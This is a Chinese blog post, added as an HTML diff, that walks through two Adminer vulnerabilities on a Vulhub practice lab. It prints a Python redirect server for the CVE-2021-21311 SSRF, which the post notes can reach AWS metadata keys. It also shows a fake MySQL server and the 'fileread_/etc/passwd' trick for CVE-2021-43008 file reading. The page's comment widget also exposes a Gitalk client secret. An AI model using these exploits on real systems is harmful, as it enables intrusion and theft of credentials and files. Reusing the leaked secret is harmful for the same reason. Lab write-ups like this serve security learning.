@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulhub-2.Adminer | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulhub-2.Adminer</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:20:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulhub/">Vulhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS-SQL、Oracle、Elasticsearch、MongoDB等数据库。"><a href="#Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS-SQL、Oracle、Elasticsearch、MongoDB等数据库。" class="headerlink" title="Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。"></a>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</h1><h2 id="Adminer的ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）在其4-0-0到4-7-9版本之间，连接-ElasticSearch-和-ClickHouse-数据库时存在一处服务端请求伪造漏洞（SSRF）。"><a href="#Adminer的ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）在其4-0-0到4-7-9版本之间，连接-ElasticSearch-和-ClickHouse-数据库时存在一处服务端请求伪造漏洞（SSRF）。" class="headerlink" title="Adminer的ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。"></a>Adminer的ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。</h2><p><img src="/vulhub-2-adminer//1.png" alt="1"></p>
+<p>在Adminer登录页面，选择ElasticSearch作为系统目标，并在server字段填写`example.com`，点击登录即可看到`example.com`返回的400错误页面展示在页面中</p>
+<p>&lt;?xml version&#x3D;”1.0” encoding&#x3D;”iso-8859-1”?&gt; &lt;!DOCTYPE html PUBLIC “-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN” “<a target="_blank" rel="noopener" href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd%22/%3E">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;\&gt;</a> &lt;html xmlns&#x3D;”<a target="_blank" rel="noopener" href="http://www.w3.org/1999/xhtml">http://www.w3.org/1999/xhtml</a>“ xml:lang&#x3D;”en” lang&#x3D;”en”&gt; &lt;head&gt; &lt;title&gt;400 - Bad Request&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;400 - Bad Request&lt;&#x2F;h1&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</p>
+<p>漏洞：使用管理员发送任意get请求并从内部服务器检索JSON响应的方法。可以从AWS元数据服务中提取AWS访问密钥。</p>
+<p>第一步是启动一个python服务器，该服务器侦听传入的连接并以301重定向响应到任意选择的主机。在此示例情况下，重定向指向AWS元数据服务</p>
+<p>代码：不过这里要改成自己的，</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python</p>
+<p>import SimpleHTTPServer</p>
+<p>import SocketServer</p>
+<p>import sys</p>
+<p>import argparse</p>
+<p>def redirect_handler_factory(url):</p>
+<p>“””</p>
+<p>Returns a request handler class that redirects to supplied `url`</p>
+<p>“””</p>
+<p>class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):</p>
+<p>def do_GET(self):</p>
+<p>self.send_response(301)</p>
+<p>self.send_header(‘Location’, url)</p>
+<p>self.end_headers()</p>
+<p>def do_POST(self):</p>
+<p>self.send_response(301)</p>
+<p>self.send_header(‘Location’, url)</p>
+<p>self.end_headers()</p>
+<p>return RedirectHandler</p>
+<p>def main():</p>
+<p>parser &#x3D; argparse.ArgumentParser(description&#x3D;’HTTP redirect server’)</p>
+<p>parser.add_argument(‘–port’, ‘-p’, action&#x3D;”store”, type&#x3D;int, default&#x3D;80, help&#x3D;’port to listen on’)</p>
+<p>parser.add_argument(‘–ip’, ‘-i’, action&#x3D;”store”, default&#x3D;””, help&#x3D;’host interface to listen on’)</p>
+<p>parser.add_argument(‘redirect_url’, action&#x3D;”store”)</p>
+<p>myargs &#x3D; parser.parse_args()</p>
+<p>redirect_url &#x3D; myargs.redirect_url</p>
+<p>port &#x3D; myargs.port</p>
+<p>host &#x3D; myargs.ip</p>
+<p>redirectHandler &#x3D; redirect_handler_factory(redirect_url)</p>
+<p>handler &#x3D; SocketServer.TCPServer((host, port), redirectHandler)</p>
+<p>print(“serving at port %s” % port)</p>
+<p>handler.serve_forever()</p>
+<p>if __name__ &#x3D;&#x3D; “__main__“:</p>
+<p>main()</p>
+<p>接下来是我的代码</p>
+<p>import SimpleHTTPServer</p>
+<p>import SocketServer</p>
+<p>import sys</p>
+<p>import argparse</p>
+<p>def redirect_handler_factory(url):</p>
+<p>“””</p>
+<p>Returns a request handler class that redirects to supplied `url`</p>
+<p>“””</p>
+<p>class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):</p>
+<p>def do_GET(self):</p>
+<p>self.send_response(301)</p>
+<p>self.send_header(‘Location’, “<a target="_blank" rel="noopener" href="https://www.zhihu.com/people/sun-67-28-76">https://www.zhihu.com/people/sun-67-28-76</a>“)</p>
+<p>self.end_headers()</p>
+<p>def do_POST(self):</p>
+<p>self.send_response(301)</p>
+<p>self.send_header(‘Location’, “<a target="_blank" rel="noopener" href="https://www.zhihu.com/people/sun-67-28-76">https://www.zhihu.com/people/sun-67-28-76</a>“)</p>
+<p>self.end_headers()</p>
+<p>#不管是GET还是POST都是重定向到我的知乎主页</p>
+<p>return RedirectHandler</p>
+<p>def main():</p>
+<p>parser &#x3D; argparse.ArgumentParser(description&#x3D;’HTTP redirect server’)</p>
+<p>parser.add_argument(‘–port’, ‘-p’, action&#x3D;”store”, type&#x3D;int, default&#x3D;20000, help&#x3D;’port to listen on’) #我20000端口已经转发到外网的3.tcp.vip.cpolar.cn:13465上面了</p>
+<p>parser.add_argument(‘–ip’, ‘-i’, action&#x3D;”store”, default&#x3D;”0.0.0.0”, help&#x3D;’host interface to listen on’)</p>
+<p>parser.add_argument(‘redirect_url’, action&#x3D;”store”)</p>
+<p>myargs &#x3D; parser.parse_args()</p>
+<p>redirect_url &#x3D; myargs.redirect_url</p>
+<p>port &#x3D; myargs.port</p>
+<p>host &#x3D; myargs.ip</p>
+<p>redirectHandler &#x3D; redirect_handler_factory(redirect_url)</p>
+<p>handler &#x3D; SocketServer.TCPServer((host, port), redirectHandler)</p>
+<p>print(“serving at port %s” % port)</p>
+<p>handler.serve_forever()</p>
+<p>if __name__ &#x3D;&#x3D; “__main__“:</p>
+<p>main()</p>
+<p>在命令行 python2 .&#x2F;poc.py –port 20000 –ip 0.0.0.0 <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/sun-67-28-76">https://www.zhihu.com/people/sun-67-28-76</a> 直接运行</p>
+<p><img src="/vulhub-2-adminer//2.png" alt="2"></p>
+<p>这里显示我的20000端口开始接客了</p>
+<p>现在回到靶场网站，服务器输入3.tcp.vip.cpolar.cn:13465，账号密码不用数</p>
+<p><img src="/vulhub-2-adminer//3.png" alt="3"></p>
+<p>明显已经重定向到我知乎主页，此方法可以运用到网站运维</p>
+<p><img src="/vulhub-2-adminer//4.png" alt="4"></p>
+<p><img src="/vulhub-2-adminer//5.png" alt="5"></p>
+<p>结束ctrl +z</p>
+<h2 id="Adminer远程文件读取（CVE-2021-43008）在其版本1-12-0到4-6-2之间存在一处因为MySQL-LOAD-DATA-LOCAL导致的文件读取漏洞。"><a href="#Adminer远程文件读取（CVE-2021-43008）在其版本1-12-0到4-6-2之间存在一处因为MySQL-LOAD-DATA-LOCAL导致的文件读取漏洞。" class="headerlink" title="Adminer远程文件读取（CVE-2021-43008）在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。"></a>Adminer远程文件读取（CVE-2021-43008）在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。</h2><p>使用fakeserver启动一个恶意的MySQL服务器。这个是下载地址<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server%E3%80%82">https://github.com/4ra1n/mysql-fake-server。</a></p>
+<p><img src="/vulhub-2-adminer//6.png" alt="6"></p>
+<p>在fakeserver填写本机端口号（我的64965端口转发到外网了27.tcp.cpolar.top:10352 ）Cmd和Generate，还有在Adminer登录页面中填写恶意服务地址和用户名`fileread_&#x2F;etc&#x2F;passwd`直接点击登录</p>
+<p><img src="/vulhub-2-adminer//7.png" alt="7"></p>
+<p>点击登录</p>
+<p><img src="/vulhub-2-adminer//8.png" alt="8"></p>
+<p>这就登录到我的钓鱼mysql了</p>
+<p><img src="/vulhub-2-adminer//9.png" alt="9"></p>
+<p>可以执行创建数据库相关命令</p>
+<p><img src="/vulhub-2-adminer//10.png" alt="10"></p>
+<p><img src="/vulhub-2-adminer//11.png" alt="11"></p>
+<p><img src="/vulhub-2-adminer//12.png" alt="12"></p>
+<p>读取到的文件`&#x2F;etc&#x2F;passwd`已保存至当前目录的文件夹下面。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulhub-3-airflow/">Vulhub-3.Airflow</a>
+            
+            
+            <a class="next" rel="next" href="../vulhub-vulhub-1apache-activemq/">Vulhub-Vulhub-1Apache_ActiveMQ</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
